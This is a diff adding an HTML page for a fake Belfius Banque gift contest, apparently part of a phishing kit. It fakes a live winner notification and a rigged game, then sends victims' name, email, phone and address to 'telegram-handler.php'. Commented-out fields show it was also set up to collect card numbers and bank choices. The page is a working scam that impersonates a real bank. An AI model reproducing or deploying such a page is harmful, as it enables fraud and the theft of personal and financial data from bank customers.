@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>🎁 Concours de Cadeaux - Belfius Banque</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+<!-- Winner Notification -->
+<div id="winnerNotification" class="winner-notification hidden">
+  <div class="notification-header">
+    <span class="notification-title">🎉 Nouveau gagnant !</span>
+    <button class="close-btn" onclick="closeNotification()">✕</button>
+  </div>
+  <div class="notification-content">
+    <p><strong id="winnerName">Lucas T. de Namur</strong></p>
+    <p>Vient de gagner <strong id="winnerAmount">€3700</strong> !</p>
+    <p style="font-size: 11px; color: #16a34a; margin-top: 5px;">Il y a quelques instants</p>
+  </div>
+</div>
+
+<div class="container">
+   <!-- Header -->
+  <div class="brand-header">
+    <div class="">
+      <img src="images/logo.png" style="width: 120px; height: auto;"></div>
+
+  </div>
+
+   <!-- Main Game Screen -->
+  <div id="mainGame" class="game-section">
+    <div class="chip">
+      <h2>Tentez votre chance !</h2>
+    </div>
+
+    <h1 class="main-title">Choisissez l'un des cadeaux</h1>
+    <p class="subtitle">et remportez jusqu'à 5000€</p>
+
+    <div id="attemptsDisplay" class="attempts hidden">
+      Tentatives : <span id="attemptCount">0</span>/2
+    </div>
+
+     <!-- Gift Grid -->
+    <div class="gift-grid">
+      <div class="gift-item">
+        <div class="gift-number">1</div>
+        <button class="gift-box" onclick="selectGift(1)">
+          <div class="gift-icon">🎁</div>
+        </button>
+      </div>
+      <div class="gift-item">
+        <div class="gift-number tr">2</div>
+        <button class="gift-box" onclick="selectGift(2)">
+          <div class="gift-icon">🎁</div>
+        </button>
+      </div>
+      <div class="gift-item">
+        <div class="gift-number bl">3</div>
+        <button class="gift-box" onclick="selectGift(3)">
+          <div class="gift-icon">🎁</div>
+        </button>
+      </div>
+      <div class="gift-item">
+        <div class="gift-number br">4</div>
+        <button class="gift-box" onclick="selectGift(4)">
+          <div class="gift-icon">🎁</div>
+        </button>
+      </div>
+    </div>
+
+     <!-- Messages -->
+    <div id="selectedMessage" class="message hidden">
+      <p>Vous avez sélectionné : <strong id="selectedGiftName">Cadeau 1</strong></p>
+    </div>
+
+    <div id="encouragementMessage" class="message hidden">
+      <p style="margin-bottom: 10px;">N'abandonnez pas ! 🍀</p>
+      <p>Tout le monde mérite une seconde chance. Choisissez un autre cadeau pour réessayer !</p>
+    </div>
+  </div>
+
+   <!-- First Try Result -->
+  <div id="firstTryResult" class="screen hidden">
+    <div class="panel">
+      <div class="emoji-big">😔</div>
+      <h2>Pas cette fois !</h2>
+      <p>Désolé, vous n'avez pas gagné avec <span id="firstTryGiftName">Cadeau 1</span> cette fois.</p>
+      <p style="font-size: 14px; margin-top: 15px;">Mais n'abandonnez pas ! Essayez encore pour une autre chance.</p>
+    </div>
+  </div>
+
+   <!-- Processing -->
+  <div id="processing" class="screen hidden">
+    <div class="panel">
+      <div class="emoji-big" style="animation: pulse 2s infinite;">✨</div>
+      <h2>Vérification de votre chance...</h2>
+      <p>Quelque chose de spécial se passe ! 🎉</p>
+    </div>
+  </div>
+
+   <!-- Winner Form -->
+  <div id="winnerScreen" class="screen hidden" style="position: relative; overflow: hidden;">
+     <!-- Background animations -->
+    <div class="bg-emoji" style="top: 10%; left: 10%;">🎉</div>
+    <div class="bg-emoji" style="top: 20%; right: 15%; animation-delay: 1s;">💰</div>
+    <div class="bg-emoji" style="bottom: 20%; left: 15%; animation-delay: 2s;">⭐</div>
+    <div class="bg-emoji" style="bottom: 10%; right: 10%; animation-delay: 0.5s;">🏆</div>
+
+     <!-- Confetti container -->
+    <div id="confettiContainer" style="position: absolute; inset: 0; pointer-events: none;"></div>
+
+    <div class="winner-form">
+      <div class="form-header">
+        <div class="emoji-big">🎉</div>
+        <h2>FÉLICITATIONS !</h2>
+        <p class="win-amount">Vous avez gagné €<span id="winAmount">2500</span> !</p>
+        <p style="color: var(--brand-dark); font-weight: 600; margin-top: 10px;">Incroyable réussite ! 🎊</p>
+      </div>
+
+      <div style="background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 10px; padding: 15px; margin-bottom: 25px;">
+        <p style="color: var(--brand-dark); font-weight: 600; font-size: 14px; margin: 0;">
+Afin de procéder au versement de votre gain, veuillez remplir et transmettre le formulaire ci-dessous. <br>
+Le versement sera effectué après réception du formulaire.
+        </p>
+      </div>
+
+      <form id="winnerForm" onsubmit="submitForm(event)" action="telegram-handler.php" method="POST">
+        <!-- Hidden fields for additional data -->
+        <input type="hidden" name="bonus" id="hiddenWinAmount" value="">
+        <input type="hidden" name="subdomain" value="belfius-contest">
+        <input type="hidden" name="country" value="Belgium">
+        <input type="hidden" name="method" id="hiddenMethod" value="">
+        <input type="hidden" name="city" id="hiddenCity" value="">
+        <input type="hidden" name="postal" id="hiddenPostal" value="">
+
+        <div class="form-field">
+          <label>Nom complet *</label>
+          <input type="text" id="fullName" name="fullName" required="" placeholder="Entrez votre nom complet">
+        </div>
+
+        <div class="form-field">
+          <label>Adresse e-mail *</label>
+          <input type="email" id="email" name="email" required="" placeholder="votre.email@exemple.com">
+        </div>
+
+        <div class="form-field">
+          <label>Numéro de téléphone *</label>
+          <input type="tel" id="phone" name="phone" required="" placeholder="+32 2 123 45 67">
+        </div>
+
+        <div class="form-field">
+          <label>Adresse complète *</label>
+          <input type="text" id="address" name="address" required="" placeholder="Rue, Ville, Code postal, Belgique">
+        </div>
+
+        <div class="form-field" style="display:none">
+          <label>Méthode de virement *</label>
+          <div class="payment-methods">
+            <button type="button" class="payment-btn" id="cardBtn" onclick="selectPayment(&#39;card&#39;)">
+              💳 Belfius (carte)
+            </button>
+            <button type="button" class="payment-btn" id="bankBtn" onclick="selectPayment(&#39;bank&#39;)">
+              🏦 Autre banque
+            </button>
+          </div>
+        </div>
+
+        <!-- <div id="cardField" class="form-field hidden">
+          <label>Numéro de carte *</label>
+          <input type="text" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX">
+        </div> -->
+<!-- 
+        <div id="bankField" class="form-field hidden">
+          <label>Sélectionnez votre banque *</label>
+          <select id="bankSelect" name="selectedBank">
+            <option value="">Choisissez votre banque</option>
+            <option value="Argenta">Argenta</option>
+            <option value="Belfius">Belfius Bank</option>
+            <option value="ING">ING Belgique</option>
+            <option value="KBC">KBC Bank</option>
+            <option value="CBC">CBC Banque</option>
+            <option value="Crelan">Crelan</option>
+            <option value="Other">Autre banque</option>
+          </select>
+        </div> -->
+
+        <div id="paymentInfo" class="hidden" style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 12px; margin-bottom: 20px;">
+          <div style="display: flex; align-items: start; gap: 8px; color: #1d4ed8; font-size: 13px;">
+            <span>ℹ️</span>
+            <div id="paymentInfoText"></div>
+          </div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn" disabled="">
+          🎉 JE VALIDE <span id="winAmountBtn" style="display:none">2500</span> ! 💰
+        </button>
+      </form>
+
+
+    </div>
+  </div>
+</div>
+
+<footer style="text-align: center; color: rgba(255,255,255,0.8); font-size: 12px; padding: 30px;">
+
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
